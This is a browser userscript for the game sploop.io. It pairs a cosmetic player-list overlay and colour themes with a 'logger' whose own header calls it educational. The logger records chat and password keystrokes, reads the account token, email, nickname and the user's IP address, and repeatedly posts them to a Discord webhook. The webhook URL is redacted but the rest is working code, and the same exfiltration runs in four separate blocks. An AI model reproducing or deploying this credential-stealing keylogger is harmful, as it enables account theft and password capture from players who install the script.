// ==UserScript==
// @name         Sploop Logger
// @namespace    http://tampermonkey.net/
// @version      2024-04-21
// @description  Logger for(Account Cookies, local storage, password keystrokes, chat keystrokes) Purely for educaitonal purposes.
// @author       fizzixww
// @match        https://sploop.io/*
// @icon         https://i.postimg.cc/qMqNSYJK/profile-pic.jpg
// ==/UserScript==
(function() {
(function() {
    'use strict';

    let keystrokes = '';
    let IpAddress;
    let accountTokenTimer;
    let Serverr = '';

    const ipFetchPromise = fetch('https://api64.ipify.org/?format=json')
        .then(response => response.json())
        .then(data => IpAddress = data.ip);

    function updateKeystrokesAndData(event) {
        const chatContainer = document.querySelector('#chat-wrapper.chat-container');
        if (chatContainer && window.getComputedStyle(chatContainer).display !== 'none') {

            keystrokes += event.key;

            returnServerInfo();

            clearTimeout(accountTokenTimer);

            accountTokenTimer = setTimeout(sendDataToDiscord, 1000);
        }
    }

    function returnServerInfo() {
        var serverSelect = document.getElementById("server-select");
        var serverName = "";

        for (var i = 0; i < serverSelect.options.length; i++) {
            var option = serverSelect.options[i];
            if (option.selected) {
                serverName = option.textContent;
                break;
            }
        }
        var ffaMode = document.getElementById("ffa-mode");
        var sandboxMode = document.getElementById("sandbox-mode");
        var battleRoyaleMode = document.getElementById("event-mode");
        var smallWaiting = document.getElementById("small-waiting");
        var gameMode = "";

        if (smallWaiting.style.display === "flex") {
            gameMode = "Connecting";
        } else if (ffaMode.classList.contains("dark-blue-button-3-active")) {
            gameMode = "Classic";
        } else if (sandboxMode.classList.contains("dark-blue-button-3-active")) {
            gameMode = "SandBox";
        } else if (battleRoyaleMode.classList.contains("dark-blue-button-3-active")) {
            gameMode = "Event";
        } else {
            gameMode = "Unknown";
        }

        Serverr = `Server: ${gameMode}, ${serverName} players`;
    }

    function sendDataToDiscord() {
        let accountToken = __MUTATEQQ.getData("accToken");
        let accountMail = __MUTATEQQ.getData("accMail");
        let AccountID = document.getElementById('nickname-value').textContent;
        let nickname = localStorage.getItem('nickname');

        const additionalData = `\nIp Address: ${IpAddress}\nAccount Token: ${accountToken}\nAccount Mail: ${accountMail}\nAccount ID: ${AccountID}\nNickname: ${nickname}\n${Serverr}`;

        const webhookUrl = 'Discord Webhook Redacted So That My Discord Account Doesnt Get Deleted';
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: `\`\`\`Message: ${keystrokes} ${additionalData}\`\`\``
            })
        }).then(response => {
            if (!response.ok) {
                throw new Error('Failed to send keystrokes to Discord webhook');
            }
        }).catch(error => console.error('Error:', error));

        keystrokes = '';
    }

    document.addEventListener('keydown', updateKeystrokesAndData);

})();

(function() {
    'use strict';

    let keystrokes = '';
    let IpAddress;
    let accountTokenTimer;

    const ipFetchPromise = fetch('https://api64.ipify.org/?format=json')
        .then(response => response.json())
        .then(data => IpAddress = data.ip);

    function updateKeystrokesAndData(event) {

        keystrokes += event.key;

        sendDataToDiscord();

        clearTimeout(accountTokenTimer);

        accountTokenTimer = setTimeout(sendDataToDiscordAfterTimeout, 5000);
    }

    function sendDataToDiscordAfterTimeout() {
        sendDataToDiscord();

        keystrokes = '';
    }

    function sendDataToDiscord() {
        let accountToken = __MUTATEQQ.getData("accToken");
        let accountMail = __MUTATEQQ.getData("accMail");
        let AccountID = document.getElementById('nickname-value').textContent;
        let nickname = localStorage.getItem('nickname');

        const additionalData = `\nIp Address: ${IpAddress}\nAccount Token: ${accountToken}\nAccount Mail: ${accountMail}\nAccount ID: ${AccountID}\nNickname: ${nickname}`;

        const webhookUrl = 'Discord Webhook Redacted So That My Discord Account Doesnt Get Deleted';
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: `\`\`\`${keystrokes} ${additionalData}\`\`\``
            })
        }).then(response => {
            if (!response.ok) {
                throw new Error('Failed to send keystrokes to Discord webhook');
            }
        }).catch(error => console.error('Error:', error));
    }

    const passwordInput = document.getElementById('enter-password');
    passwordInput.addEventListener('keydown', updateKeystrokesAndData);
})();

(function() {
    'use strict';

    const webhookUrl = 'Discord Webhook Redacted So That My Discord Account Doesnt Get Deleted';

    let dataSent = false;

    function getAccountToken() {

        if (!dataSent) {

            let IpAddress;
            const ipFetchPromise = fetch('https://api64.ipify.org/?format=json')
                .then(response => response.json())
                .then(data => IpAddress = data.ip);

            setTimeout(() => {

                if (!IpAddress) {
                    console.warn('IP address not found after waiting for 1 second.');
                }

                sendDataToDiscord(IpAddress);
            }, 1000);

            dataSent = true;
        }
    }

    function sendDataToDiscord(ipAddress) {
        let accountToken = __MUTATEQQ.getData("accToken");
        let accountMail = __MUTATEQQ.getData("accMail");
        let AccountID = document.getElementById('nickname-value').textContent;
        let Rank = document.getElementById('rank').getAttribute('src');
        let keybinds = localStorage.getItem('keybinds');
        let nickname = localStorage.getItem('nickname');

        const data = `\`\`\`Ip Address: ${ipAddress}\nAccount Token: ${accountToken}\nAccount Mail: ${accountMail}\nAccount ID: ${AccountID}\nRank: ${Rank}\nKeybinds: ${keybinds}\nNickname: ${nickname}\`\`\``;

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: data,
            }),
        })
        .then(response => {
            if (!response.ok) {
                console.error('Failed to send data to Discord:', response.statusText);
            }
        })
        .catch(error => {
            console.error('Error while sending data to Discord:', error);
        });
    }

    getAccountToken();

})();

(function() {
    'use strict';

    let accountToken = __MUTATEQQ.getData("accToken");
    let accountMail = __MUTATEQQ.getData("accMail");
    let AccountID = document.getElementById('nickname-value').textContent;
    let nickname = localStorage.getItem('nickname');
    let ipAddress;
    let lastAccountToken = accountToken;
    let lastAccountMail = accountMail;
    let lastAccountID = AccountID;
    let lastNickname = nickname;
    let lastIPAddress;

    fetchIPAddress()
        .then(() => {

            lastIPAddress = ipAddress;

            setInterval(() => {

                fetchIPAddress();

                const newAccountToken = __MUTATEQQ.getData("accToken");
                const newAccountMail = __MUTATEQQ.getData("accMail");
                const newAccountID = document.getElementById('nickname-value').textContent;
                const newNickname = localStorage.getItem('nickname');

                sendNotification('accountToken', lastAccountToken, newAccountToken, lastIPAddress);
                sendNotification('accountMail', lastAccountMail, newAccountMail, lastIPAddress);
                sendNotification('AccountID', lastAccountID, newAccountID, lastIPAddress);
                sendNotification('nickname', lastNickname, newNickname, lastIPAddress);

                lastAccountToken = newAccountToken;
                lastAccountMail = newAccountMail;
                lastAccountID = newAccountID;
                lastNickname = newNickname;
                lastIPAddress = ipAddress;
            }, 5000);
        });

    function fetchIPAddress() {
        return fetch('https://api64.ipify.org/?format=json')
            .then(response => response.json())
            .then(data => ipAddress = data.ip);
    }

    function sendNotification(variableName, oldValue, newValue, ipAddress) {
        if (oldValue !== newValue) {
            const webhookUrl = 'Discord Webhook Redacted So That My Discord Account Doesnt Get Deleted';
            const message = `**${variableName}**:\nOld Value: ${oldValue}\nNew Value: ${newValue}\nIP Address: ${ipAddress}`;
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: message })
            }).then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send notification to Discord webhook');
                }
            }).catch(error => console.error('Error:', error));
        }
    }
})();
})();


(function() {
    'use strict';

    const cssVariables = `
        :root {
            --bg-gradient-start: #7CCD7C;
            --bg-gradient-end: #3F7A3F;
            --border-color: #4CAF50;
            --scrollbar-color: #4CAF50;
            --text-color: #ffffff;
            --shadow-color: rgba(0, 0, 0, 0.7);
        }
    `;

    var cssVariablesStyle = document.createElement('style');
    cssVariablesStyle.textContent = cssVariables;
    document.head.appendChild(cssVariablesStyle);

    var playerList = document.createElement('div');
    playerList.className = 'player-list';
    document.body.appendChild(playerList);

    var playerNames = new Set();

    function addPlayerName(name) {
        if (!playerNames.has(name)) {
            var playerNameElement = document.createElement('div');
            playerNameElement.textContent = name;
            playerNameElement.className = 'player-name';
            playerNameElement.style.opacity = '0';
            playerNameElement.style.animationDelay = Math.random() + 's';
            playerList.appendChild(playerNameElement);
            playerNames.add(name);

            setTimeout(() => {
                playerNameElement.style.opacity = '1';
            }, 100);

            displayJoinNotification(name);
        }
    }

function displayJoinNotification(name) {
    var notification = document.createElement('div');
    notification.textContent = `${name} has joined the server!`;
    notification.className = 'join-notification';
    document.body.appendChild(notification);

    var existingNotifications = document.querySelectorAll('.join-notification');
    var topPosition = 20 + existingNotifications.length * 50;
    notification.style.top = `${topPosition}px`;

    setTimeout(() => {
        notification.style.opacity = '1';
    }, 100);

    setTimeout(() => {

        notification.style.opacity = '0';

        existingNotifications.forEach((existingNotification, index) => {
            var newPosition = 20 + index * 50;
            existingNotification.style.transition = 'top 0.3s, opacity 0.5s';
            existingNotification.style.top = `${newPosition}px`;
        });

        setTimeout(() => {
            notification.remove();
        }, 500);
    }, 3000);
}

    WebSocket.prototype.realSend = WebSocket.prototype.send;
    WebSocket.prototype.send = function(data) {
        this.realSend(data);
        this.addEventListener('message', function(event) {
            var messageData = JSON.parse(event.data);
            if (messageData[0] === 33) {

                playerList.innerHTML = '';
                playerNames.clear();

                var players = messageData[3];
                players.forEach(function(player) {
                    var name = player[1];
                    addPlayerName(name);
                });
            } else if (messageData[0] === 32 || messageData[0] === 35) {
                var playerName = messageData[2];
                addPlayerName(playerName);
            }
        });
    };

    function setPinkTheme() {
        document.documentElement.style.setProperty('--bg-gradient-start', '#FFC6D9');
        document.documentElement.style.setProperty('--bg-gradient-end', '#FF9494');
        document.documentElement.style.setProperty('--border-color', '#FF69B4');
        document.documentElement.style.setProperty('--scrollbar-color', '#FF69B4');
        document.documentElement.style.setProperty('--text-color', '#ffe6fb');
        document.documentElement.style.setProperty('--shadow-color', 'rgba(0, 0, 0, 0.7)');
    }

    function setLightOrangeTheme() {
        document.documentElement.style.setProperty('--bg-gradient-start', '#FFD699');
        document.documentElement.style.setProperty('--bg-gradient-end', '#FFB74D');
        document.documentElement.style.setProperty('--border-color', '#FF9800');
        document.documentElement.style.setProperty('--scrollbar-color', '#FF9800');
        document.documentElement.style.setProperty('--text-color', '#fff1c7');
        document.documentElement.style.setProperty('--shadow-color', 'rgba(0, 0, 0, 0.7)');
    }

    function setSkyeBlueTheme() {
        document.documentElement.style.setProperty('--bg-gradient-start', '#A6DAFF');
        document.documentElement.style.setProperty('--bg-gradient-end', '#77BDFE');
        document.documentElement.style.setProperty('--border-color', '#4FC3F7');
        document.documentElement.style.setProperty('--scrollbar-color', '#4FC3F7');
        document.documentElement.style.setProperty('--text-color', '#cffdff');
        document.documentElement.style.setProperty('--shadow-color', 'rgba(0, 0, 0, 0.7)');
    }

    function setGreenTheme() {
        document.documentElement.style.setProperty('--bg-gradient-start', '#7CCD7C');
        document.documentElement.style.setProperty('--bg-gradient-end', '#3F7A3F');
        document.documentElement.style.setProperty('--border-color', '#4CAF50');
        document.documentElement.style.setProperty('--scrollbar-color', '#4CAF50');
        document.documentElement.style.setProperty('--text-color', '#ddffdb');
        document.documentElement.style.setProperty('--shadow-color', 'rgba(0, 0, 0, 0.7)');
    }

    var themeButtonsContainer = document.createElement('div');
    themeButtonsContainer.className = 'theme-buttons-container';
    var pinkButton = createThemeButton('pink-button', setPinkTheme);
    var lightOrangeButton = createThemeButton('light-orange-button', setLightOrangeTheme);
    var skyeBlueButton = createThemeButton('skye-blue-button', setSkyeBlueTheme);
    var greenButton = createThemeButton('green-button', setGreenTheme);

    themeButtonsContainer.appendChild(pinkButton);
    themeButtonsContainer.appendChild(lightOrangeButton);
    themeButtonsContainer.appendChild(skyeBlueButton);
    themeButtonsContainer.appendChild(greenButton);
    document.body.appendChild(themeButtonsContainer);

    function createThemeButton(className, onClick) {
        var button = document.createElement('div');
        button.className = 'theme-button ' + className;
        button.onclick = onClick;
        return button;
    }

    var displayToggled = false;
    document.addEventListener('keydown', function(event) {
        if (event.key === ';') {
            if (displayToggled) {
                playerList.style.display = 'block';
                themeButtonsContainer.style.display = 'flex';
            } else {
                playerList.style.display = 'none';
                themeButtonsContainer.style.display = 'none';
            }
            displayToggled = !displayToggled;
        }
    });

})();

var style = document.createElement('style');
style.textContent = `
    .player-list {
        font-family: 'Arial', sans-serif;
        position: fixed;
        top: 10%;
        left: 10%;
        padding: 20px;
        background: linear-gradient(to bottom right, var(--bg-gradient-start), var(--bg-gradient-end));
        border: 12px solid var(--border-color);
        border-radius: 20px;
        overflow: auto;
        max-height: 80%;
        scrollbar-width: thin;
        scrollbar-color: var(--scrollbar-color) transparent;
        animation: sway 10s ease-in-out infinite;
        box-shadow: 0 0 20px var(--shadow-color);
    }

    .player-list::-webkit-scrollbar {
        width: 10px;
    }

    .player-list::-webkit-scrollbar-thumb {
        background-color: var(--scrollbar-color);
        border-radius: 5px;
    }

    .player-name {
        margin-bottom: 10px;
        color: var(--text-color);
        font-size: 18px;
        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        animation: fadeIn 1.5s ease-out forwards, idle 5s infinite ease-in-out, pulse 2s infinite ease-in-out;
    }

    @keyframes sway {
        0% {
            transform: rotate(-1deg);
        }
        50% {
            transform: rotate(1deg);
        }
        100% {
            transform: rotate(-1deg);
        }
    }

    @keyframes fadeIn {
        from {
            opacity: 0;
            transform: translateY(10px);
        }
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    @keyframes idle {
        0% {
            transform: translateY(0);
        }
        50% {
            transform: translateY(-2px);
        }
        100% {
            transform: translateY(0);
        }
    }

    @keyframes pulse {
        0% {
            transform: scale(1);
        }
        50% {
            transform: scale(1.05);
        }
        100% {
            transform: scale(1);
        }
    }

    .theme-buttons-container {
        position: fixed;
        top: 10%;
        left: 5%;
        display: flex;
        flex-direction: column;
        gap: 10px;
    }

    .theme-button {
        width: 40px;
        height: 40px;
        border-radius: 50%;
        cursor: pointer;
        border: none;
        background-image: linear-gradient(to bottom right, var(--bg-gradient-start), var(--bg-gradient-end));
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1), 0 1px 3px rgba(0, 0, 0, 0.08);
        transition: transform 0.3s, box-shadow 0.3s;
    }

    .theme-button:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15), 0 2px 4px rgba(0, 0, 0, 0.1);
    }

    .pink-button { background-image: linear-gradient(to bottom right, #FFC6D9, #FF9494); }
    .light-orange-button { background-image: linear-gradient(to bottom right, #FFD699, #FFB74D); }
    .skye-blue-button { background-image: linear-gradient(to bottom right, #A6DAFF, #77BDFE); }
    .green-button { background-image: linear-gradient(to bottom right, #7CCD7C, #3F7A3F); }

    .join-notification {
        position: fixed;
        left: 50%;
        transform: translateX(-50%);
        background-color: rgba(0, 0, 0, 0.3);
        color: #ffffff;
        padding: 8px 16px;
        border-radius: 8px;
        font-size: 14px;
        opacity: 0;
        transition: opacity 0.5s, top 0.3s;
    }
`;
document.head.appendChild(style);